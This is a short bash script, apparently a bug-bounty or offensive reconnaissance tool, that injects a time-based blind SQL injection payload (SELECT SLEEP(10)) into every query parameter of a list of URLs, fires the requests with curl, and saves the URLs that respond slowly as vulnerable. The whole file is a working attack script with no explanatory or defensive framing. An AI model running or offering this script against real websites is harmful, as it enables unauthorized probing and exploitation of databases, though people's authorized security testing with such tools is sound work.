#!/bin/bash

cat $1 | grep "=" | qsreplace "1 AND (SELECT 5230 FROM (SELECT(SLEEP(10)))SUmc)" >blindsqli.txt

while IFS= read -r url; do
    time=$(curl -o /dev/null -s -w "%{time_total}" "$url")
    echo "$time $url"
done <blindsqli.txt | awk '$1 >= 10 && $1 !~ /[^0-9.]+/ {print $1, $2}' | tee workedvuln.txt
